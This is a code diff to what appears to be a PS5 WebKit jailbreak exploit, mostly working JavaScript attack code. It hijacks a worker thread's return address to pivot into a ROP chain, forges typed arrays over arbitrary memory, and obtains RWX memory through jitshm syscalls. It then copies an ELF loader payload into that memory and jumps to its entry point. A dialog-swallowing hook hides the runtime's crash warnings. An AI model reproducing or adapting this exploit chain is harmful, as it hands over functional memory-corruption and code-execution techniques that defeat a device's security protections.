@@ -225,28 +225,50 @@ loadExploitModules();
 // GLOBAL FAILURE CAPTURE
 // The native WebKit dialogs ("You're trying to write a non
 // number/non int64 value?", then "not enough memory space" and a
-// WebProcess crash) are emitted by the PS5's own runtime, NOT by
-// this module -- so they never reach the on-screen console. Mirror
-// them (and any uncaught JS error / promise rejection, including
-// those raised inside the WebWorker ROP path) into the console so
-// a "silent" failure leaves a visible trace we can debug from.
+// WebProcess crash) are emitted by the PS5's own runtime around the
+// ROP-stack / pair-carrier writes. Mirror them -- plus any uncaught
+// JS error / promise rejection -- into the on-screen console WITH a
+// JS stack trace so the exact failing call site is visible.
+// The bad-write dialog is swallowed on purpose: clicking OK just lets
+// the corrupted WebProcess continue until it OOM-crashes.
 // ============================================================
+function captureStack(extra) {
+    try {
+        const e = new Error(extra || "capture");
+        return (e && e.stack) ? "\n" + e.stack : "";
+    } catch (err) { return ""; }
+}
 function consoleTrace(tag, text) {
     try { if (typeof log === "function") log(`[${tag}] ${text}`, "log-warn"); } catch (e) {}
+    try { console.error(`[${tag}] ${text}`); } catch (e) {}
 }
 window.addEventListener("error", (e) => {
     const m = (e && e.message) ? e.message : String(e);
     const where = (e && e.filename) ? ` @${e.filename}:${(e && e.lineno) || 0}` : "";
-    consoleTrace("WINDOW-ERROR", m + where);
+    const st = (e && e.error && e.error.stack) ? "\n" + e.error.stack : captureStack();
+    consoleTrace("WINDOW-ERROR", m + where + st);
 });
 window.addEventListener("unhandledrejection", (e) => {
     const r = (e && e.reason);
     const msg = (r && (r.message || r)) ? (r.message || String(r)) : String(r);
-    consoleTrace("UNHANDLED-PROMISE", msg);
+    const st = (r && r.stack) ? "\n" + r.stack : "";
+    consoleTrace("UNHANDLED-PROMISE", msg + st);
 });
 if (window.alert) {
     const nativeAlert = window.alert.bind(window);
-    window.alert = function (m) { consoleTrace("ALERT", String(m)); return nativeAlert(m); };
+    const BAD_WRITE_ALERT = /non number|non int64|int64 value/i;
+    window.alert = function (m) {
+        const text = String(m);
+        const stack = captureStack();
+        consoleTrace("ALERT", text + stack);
+        // The bad-write dialog came from rop.js pushing a non-number/non-int64
+        // into the ROP stack; set_entry() now throws instead, so this path
+        // only fires if the PS5's own runtime raises it. Either way: log it,
+        // swallow it, and let the JS error surface through the handlers so we
+        // fail cleanly instead of OOM-crashing the WebProcess.
+        if (BAD_WRITE_ALERT.test(text)) return;
+        return nativeAlert(m);
+    };
 }
 
 
@@ -698,6 +720,7 @@ return {
     wk_memset_import: OFFSET_wk_memset_import,
     wk_stack_chk_guard_import: OFFSET_wk___stack_chk_guard_import,
     lc_memset: OFFSET_lc_memset,
+    lc_memcpy: OFFSET_lc_memcpy,
     lc_setjmp: OFFSET_lc_setjmp,
     lc_longjmp: OFFSET_lc_longjmp,
     lk_stack_chk_guard: OFFSET_lk___stack_chk_guard,
@@ -873,12 +896,50 @@ async function initROP() {
     let syscalls = {};
     for (let s in offsets.syscall_map) syscalls[s] = libKernelBase.add32(offsets.syscall_map[s]);
 
+    // Backing stores must stay reachable for the whole run: the chain writes
+    // through these pointers from a hijacked worker thread, so if the GC frees
+    // one the thread keeps writing into freed memory -- that is the "not enough
+    // memory space" crash. slopkit-main/slopkit/main.js keeps the same nogc
+    // list; mirror it here instead of relying on the local going out of scope.
+    const nogc = [];
+
     function malloc(sz) {
         let backing = new Uint32Array(0x10000 + sz);
+        nogc.push(backing);
         let ptr = p.read8(p.leakval(backing).add32(0x10));
         ptr.backing = backing;
         return ptr;
     }
+
+    // Forges a Uint8Array whose buffer aliases `addr`, so a whole payload can
+    // be copied with one tight loop instead of ~400k single-byte primitive
+    // writes. Same construction main.js uses.
+    function array_from_address(addr, size) {
+        let og_array = new Uint8Array(1001);
+        let og_array_i = p.leakval(og_array).add32(0x10);
+        nogc.push(og_array);
+
+        function setAddr(newAddr, newSize) {
+            p.write8(og_array_i, newAddr);
+            p.write4(og_array_i.add32(0x8), newSize);
+            p.write4(og_array_i.add32(0xC), 0x1);
+        }
+
+        setAddr(addr, size);
+        og_array.setAddr = setAddr;
+        return og_array;
+    }
+
+    // The chain hijacks a worker thread's saved return address, so that slot
+    // is single-use: once a run has pivoted it, it holds `pop rsp` and the
+    // original wait-return fingerprint is gone. Keep one worker and remember
+    // the slot instead of re-deriving them per run -- the old code spawned a
+    // new Worker every time but then re-scanned the thread list, which picked
+    // up the stale already-hijacked thread and made the second chain fail to
+    // find its fingerprint (and leave that thread wedged).
+    let ropWorker = null;
+    let ropWorkerStack = null;
+    let ropReturnSlot = null;
 
     let chain = new worker_rop({
         write8: p.write8, write4: p.write4, write2: p.write2, write1: p.write1,
@@ -887,6 +948,7 @@ async function initROP() {
         malloc: malloc,
         mallocDump: function(sz) {
             const backing = new Uint8Array(sz);
+            nogc.push(backing);
             const ptr = p.read8(p.leakval(backing).add32(0x10));
             ptr.backing = backing;
             return ptr;
@@ -894,6 +956,7 @@ async function initROP() {
         stringify: function(str) {
             const backing = new Uint8Array(str.length + 1);
             for (let i = 0; i < str.length; i++) backing[i] = str.charCodeAt(i) & 0xff;
+            nogc.push(backing);
             const ptr = p.read8(p.leakval(backing).add32(0x10));
             ptr.backing = backing;
             return ptr;
@@ -920,8 +983,10 @@ async function initROP() {
             }
             p.write1(waddr, 0x0);
         },
+        nogc: nogc,
         gadgets: gadgets,
         syscalls: syscalls,
+        array_from_address: array_from_address,
         libSceNKWebKitBase: libSceNKWebKitBase,
         libSceLibcInternalBase: libSceLibcInternalBase,
         libKernelBase: libKernelBase,
@@ -930,78 +995,207 @@ async function initROP() {
             c.push(c.return_value);
             c.push(libSceLibcInternalBase.add32(offsets.lc_setjmp));
         },
-        launch_chain: async (c) => {
-        let worker = new Worker("slopkit-main/slopkit/rop_slave.js?v=final");
-        await new Promise(r => { worker.onmessage = r; worker.postMessage(0); });
-        let worker_stack = null;
-        for (let thread = p.read8(libKernelBase.add32(offsets.lk_thread_list)); thread.low != 0 || thread.hi != 0; thread = p.read8(thread.add32(0x38))) {
-            let stack = p.read8(thread.add32(0xA8));
-            let stacksz = p.read8(thread.add32(0xB0));
-            if (stacksz.low == 0x80000) { worker_stack = stack; break; }
+        launch_chain: async (c, opts) => {
+        // opts.noReturn hands the hijacked thread to a payload that never
+        // comes back (elfldr is a server), so skip the longjmp restore and do
+        // not wait for a reply that can never arrive.
+        const noReturn = !!(opts && opts.noReturn);
+
+        if (!ropWorker) {
+            ropWorker = new Worker("slopkit-main/slopkit/rop_slave.js?v=final");
+            await new Promise(r => { ropWorker.onmessage = r; ropWorker.postMessage(0); });
         }
-        if (!worker_stack) throw new Error("worker stack not found");
 
-        let return_address_ptr = await new Promise((resolve, reject) => {
-            const expected = libKernelBase.add32(offsets.lk_worker_wait_return);
-            let attempts = 0;
-            const search = () => {
-                for (let offset = 0x7F000; offset < 0x80000; offset += 8) {
-                    const candidate = worker_stack.add32(offset);
-                    const value = p.read8(candidate);
-                    if (value.low === expected.low && value.hi === expected.hi) { resolve(candidate); return; }
-                }
-                if (++attempts < 50) setTimeout(search, 1);
-                else reject(new Error("worker return fingerprint not found"));
-            };
-            search();
-        });
+        if (!ropReturnSlot) {
+            ropWorkerStack = null;
+            for (let thread = p.read8(libKernelBase.add32(offsets.lk_thread_list)); thread.low != 0 || thread.hi != 0; thread = p.read8(thread.add32(0x38))) {
+                let stack = p.read8(thread.add32(0xA8));
+                let stacksz = p.read8(thread.add32(0xB0));
+                if (stacksz.low == 0x80000) { ropWorkerStack = stack; break; }
+            }
+            if (!ropWorkerStack) throw new Error("worker stack not found");
 
-        let original_return_address = p.read8(return_address_ptr);
+            ropReturnSlot = await new Promise((resolve, reject) => {
+                const expected = libKernelBase.add32(offsets.lk_worker_wait_return);
+                let attempts = 0;
+                const search = () => {
+                    for (let offset = 0x7F000; offset < 0x80000; offset += 8) {
+                        const candidate = ropWorkerStack.add32(offset);
+                        const value = p.read8(candidate);
+                        if (value.low === expected.low && value.hi === expected.hi) { resolve(candidate); return; }
+                    }
+                    if (++attempts < 50) setTimeout(search, 1);
+                    else reject(new Error("worker return fingerprint not found"));
+                };
+                search();
+            });
+        }
+
+        let return_address_ptr = ropReturnSlot;
         let stack_pointer_ptr = return_address_ptr.add32(0x8);
-        let original_context = malloc(0x40);
 
-        c.push_write8(original_context, original_return_address);
-        c.push_write8(original_context.add32(0x10), return_address_ptr);
-        c.push_write8(stack_pointer_ptr, p.read8(stack_pointer_ptr));
-        c.push(gadgets["pop rdi"]); c.push(original_context);
-        c.push(libSceLibcInternalBase.add32(offsets.lc_longjmp));
+        if (!noReturn) {
+            let original_return_address = p.read8(return_address_ptr);
+            let original_context = malloc(0x40);
+
+            c.push_write8(original_context, original_return_address);
+            c.push_write8(original_context.add32(0x10), return_address_ptr);
+            c.push_write8(stack_pointer_ptr, p.read8(stack_pointer_ptr));
+            c.push(gadgets["pop rdi"]); c.push(original_context);
+            c.push(libSceLibcInternalBase.add32(offsets.lc_longjmp));
+        }
 
         if (p.jb && p.jb.hot) log(`Writing retaddr 0x${return_address_ptr.toString()}`, "log-info");
         p.write8(return_address_ptr, gadgets["pop rsp"]);
         p.write8(stack_pointer_ptr, c.stack_entry_point);
 
-        await new Promise(r => { worker.onmessage = r; worker.postMessage(0); });
+        if (noReturn) {
+            // This thread now lives inside the payload; never reuse it.
+            ropWorker = null;
+            ropWorkerStack = null;
+            ropReturnSlot = null;
+            return;
+        }
+        await new Promise(r => { ropWorker.onmessage = r; ropWorker.postMessage(0); });
     }});
 
     exploitState.chain = chain;
-    return { p, chain, gadgets, syscalls, libSceNKWebKitBase, libSceLibcInternalBase, libKernelBase };
+    return { p, chain, gadgets, syscalls, malloc, array_from_address, nogc, libSceNKWebKitBase, libSceLibcInternalBase, libKernelBase, libcMemcpy: libSceLibcInternalBase.add32(offsets.lc_memcpy) };
 }
 
-async function loadElfldrViaROP({ p, chain, syscalls, libKernelBase }) {
+async function loadElfldrViaROP({ p, chain, syscalls, nogc, libcMemcpy }) {
     log("Loading elfldr-ps5-1360.elf via ROP...", "log-info");
     const res = await fetch("payloads/elfldr-ps5-1360.elf");
     if (!res.ok) throw new Error("Failed to fetch elfldr");
     const elfData = new Uint8Array(await res.arrayBuffer());
 
-    const mmap = 0x1DD; // SYS_MMAP
-    const addr = 0x90000000;
-    const size = (elfData.length + 0x3FFF) & ~0x3FFF;
-    const prot = 7; // RWX
-    const flags = 0x1002; // MAP_PRIVATE | MAP_ANONYMOUS
-    const fd = -1;
-    const off = 0;
+    const PAGE = 0x4000;
+    const PROT_RWX = 0x7, PROT_RW = 0x3;
+    const MAP_SHARED = 0x1;
+    const SYS_MMAP = 0x1DD;
+    const SYS_JITSHM_CREATE = 0x215, SYS_JITSHM_ALIAS = 0x216;
 
-    chain.fcall(syscalls[mmap], addr, size, prot, flags, fd, off);
-    chain.write_result(chain.return_value);
+    // ---- 1. parse the ELF --------------------------------------------------
+    // elfldr-ps5-1360.elf is ET_DYN (a PIE): the file is NOT a flat image and
+    // the entry point lives at base + e_entry. Copying the file 1:1 and
+    // jumping to the mapping base -- what this used to do -- lands on the
+    // \x7fELF header, not on code.
+    const dv = new DataView(elfData.buffer, elfData.byteOffset, elfData.byteLength);
+    if (dv.getUint32(0, false) !== 0x464C457F) throw new Error("elfldr: not an ELF file");
+    const eType = dv.getUint16(16, true);
+    const eEntry = dv.getUint32(24, true);
+    const ePhoff = dv.getUint32(32, true);
+    const ePhentsize = dv.getUint16(54, true);
+    const ePhnum = dv.getUint16(56, true);
+
+    const segments = [];
+    let span = 0;
+    for (let i = 0; i < ePhnum; i++) {
+        const o = ePhoff + i * ePhentsize;
+        if (o + ePhentsize > elfData.length) break;
+        if (dv.getUint32(o, true) !== 1) continue;            // PT_LOAD only
+        const off = dv.getUint32(o + 8, true);
+        const vaddr = dv.getUint32(o + 16, true);
+        const filesz = dv.getUint32(o + 32, true);
+        const memsz = dv.getUint32(o + 40, true);
+        if (off + filesz > elfData.length)
+            throw new Error(`elfldr: PT_LOAD #${i} (off 0x${off.toString(16)}, `
+                + `filesz 0x${filesz.toString(16)}) runs past the end of the file`);
+        segments.push({ off, vaddr, filesz, memsz });
+        if (vaddr + memsz > span) span = vaddr + memsz;
+    }
+    if (!segments.length) throw new Error("elfldr: no PT_LOAD segments to load");
+    const imageSize = (span + PAGE - 1) & ~(PAGE - 1);
+    log(`elfldr: ${eType === 3 ? "PIE (ET_DYN)" : "ET_" + eType}, entry +0x${eEntry.toString(16)}, `
+        + `${segments.length} PT_LOAD, image 0x${imageSize.toString(16)}`, "log-info");
+
+    // ---- 2. get executable memory ------------------------------------------
+    // PS5 does not grant an unprivileged anonymous RWX mapping. Ask
+    // jitshm_create(2) for an executable fd and mmap MAP_SHARED over it, which
+    // is what the validated slopkit stage-5 loader does. The old code asked for
+    // MAP_PRIVATE|MAP_ANONYMOUS with fd = -1, which always returns -1 -- and it
+    // then went on to write 397 KB of ELF at 0xffffffffffffffff, which is what
+    // ended in "not enough memory space".
+    const jitFd = await chain.syscall_int32(SYS_JITSHM_CREATE, 0, imageSize, PROT_RWX);
+    if (!(jitFd >= 0)) throw new Error(`jitshm_create(0x215) failed: fd=${jitFd}`);
+    log(`jitshm_create -> fd ${jitFd} (0x${imageSize.toString(16)} bytes, PROT_RWX)`, "log-ok");
+
+    const mapped = await chain.syscall(SYS_MMAP, 0, imageSize, PROT_RWX, MAP_SHARED, jitFd, 0);
+    if ((mapped.low >>> 0) === 0xFFFFFFFF && (mapped.hi >>> 0) === 0xFFFFFFFF)
+        throw new Error("mmap(PROT_RWX, MAP_SHARED, jitshm fd) returned -1");
+    if (mapped.hi > 0xffff)
+        throw new Error(`mmap returned a non-canonical address: 0x${mapped.toString()}`);
+    log(`elfldr mapped RWX at 0x${mapped.toString()}`, "log-ok");
+
+    // ---- 3. stage the image and copy it in with one memcpy ------------------
+    // A per-byte primitive loop would be ~400k carrier round trips; memcpy runs
+    // on the hijacked thread and is instant.
+    const staging = new Uint8Array(imageSize);
+    for (const s of segments) staging.set(elfData.subarray(s.off, s.off + s.filesz), s.vaddr);
+    nogc.push(staging);
+    const stagingPtr = p.read8(p.leakval(staging).add32(0x10));
+    log(`staging ${imageSize} byte image at 0x${stagingPtr.toString()}`, "log-info");
+
+    const expectDword = (off) =>
+        (elfData[off] | (elfData[off + 1] << 8) | (elfData[off + 2] << 16)
+            | (elfData[off + 3] << 24)) >>> 0;
+    function verifyWrite(at) {
+        let bad = 0, firstBad = -1;
+        for (const s of segments) {
+            for (let o = 0; o + 4 <= s.filesz; o += 0x4000) {
+                if ((p.read4(at.add32(s.vaddr + o)) >>> 0) !== expectDword(s.off + o)) {
+                    if (firstBad < 0) firstBad = s.vaddr + o;
+                    bad++;
+                }
+            }
+        }
+        return { bad, firstBad };
+    }
+
+    chain.fcall(libcMemcpy, mapped, stagingPtr, imageSize);
     await chain.run();
-    const mappedAddr = p.read8(chain.return_value);
-    log(`mmap elfldr at 0x${mappedAddr.toString()}`, "log-ok");
 
-    const memView = p.array_from_address(mappedAddr, elfData.length);
-    for (let i = 0; i < elfData.length; i++) memView[i] = elfData[i];
+    let v = verifyWrite(mapped);
+    if (v.bad !== 0) {
+        // The exec mapping refused the write; retry through a RW alias of the
+        // same jitshm object, exactly like the slopkit stage-5 loader does.
+        log(`write to the exec mapping did not land (${v.bad} bad dwords, first at `
+            + `+0x${v.firstBad.toString(16)}); retrying via jitshm_alias`, "log-warn");
+        const wFd = await chain.syscall_int32(SYS_JITSHM_ALIAS, jitFd, PROT_RW);
+        if (!(wFd >= 0)) throw new Error(`jitshm_alias(0x216) failed: fd=${wFd}`);
+        const wAddr = await chain.syscall(SYS_MMAP, 0, imageSize, PROT_RW, MAP_SHARED, wFd, 0);
+        if ((wAddr.low >>> 0) === 0xFFFFFFFF && (wAddr.hi >>> 0) === 0xFFFFFFFF)
+            throw new Error("mmap of the jitshm alias returned -1");
+        chain.fcall(libcMemcpy, wAddr, stagingPtr, imageSize);
+        await chain.run();
+        v = verifyWrite(wAddr);
+        if (v.bad !== 0)
+            throw new Error(`elfldr image did not land: ${v.bad} bad dwords, first at `
+                + `+0x${v.firstBad.toString(16)} (alias fd ${wFd})`);
+        log(`image written through jitshm alias fd ${wFd} @ 0x${wAddr.toString()}`, "log-ok");
+    } else {
+        log(`image verified in the exec mapping (${segments.length} PT_LOAD segments)`, "log-ok");
+    }
 
-    chain.fcall(mappedAddr);
-    await chain.run();
+    // ---- 4. enter the ELF --------------------------------------------------
+    // _start reads argc/argv/envp out of the registers, and those registers
+    // still hold chain data, so hand it a real (if minimal) triple.
+    const args = new Uint32Array(0x40);
+    nogc.push(args);
+    const argsPtr = p.read8(p.leakval(args).add32(0x10));
+    p.write8(argsPtr, 0);                                  // envp[0] = NULL
+    p.write8(argsPtr.add32(0x10), argsPtr.add32(0x20));   // argv[0] -> name
+    p.write8(argsPtr.add32(0x18), 0);                      // argv[1] = NULL
+    const argv0 = "elfldr";
+    for (let i = 0; i < argv0.length; i++) p.write1(argsPtr.add32(0x20 + i), argv0.charCodeAt(i));
+    p.write1(argsPtr.add32(0x20 + argv0.length), 0);
+
+    const entryAddr = mapped.add32(eEntry);
+    log(`calling elfldr entry 0x${entryAddr.toString()} (base + e_entry)`, "log-info");
+    chain.fcall(entryAddr, 1, argsPtr.add32(0x10), argsPtr);
+    // elfldr is a server: it never returns, so hand the thread over instead of
+    // waiting for a worker reply that can never arrive.
+    await chain.p.launch_chain(chain, { noReturn: true });
     log("elfldr entry executed", "log-ok");
 
     for (let i = 0; i < 60; i++) {
